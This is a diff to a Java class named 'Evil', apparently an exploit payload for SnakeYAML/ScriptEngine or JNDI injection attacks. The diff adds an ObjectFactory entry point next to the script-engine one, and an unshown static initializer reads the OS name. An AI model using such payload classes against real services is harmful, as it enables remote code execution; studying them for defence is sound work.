@@ -1,10 +1,14 @@
+import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
 import javax.script.ScriptEngine;
 import javax.script.ScriptEngineFactory;
 import java.io.IOException;
+import java.util.Hashtable;
 import java.util.List;
 import java.util.Locale;
 
-public class Evil implements ScriptEngineFactory {
+public class Evil implements ScriptEngineFactory, ObjectFactory  {
 
     static{
         String os = System.getProperty("os.name");
@@ -81,6 +85,11 @@ public class Evil implements ScriptEngineFactory {
 
     @Override
     public ScriptEngine getScriptEngine() {
+        return null;
+    }
+
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
         return null;
     }
 }
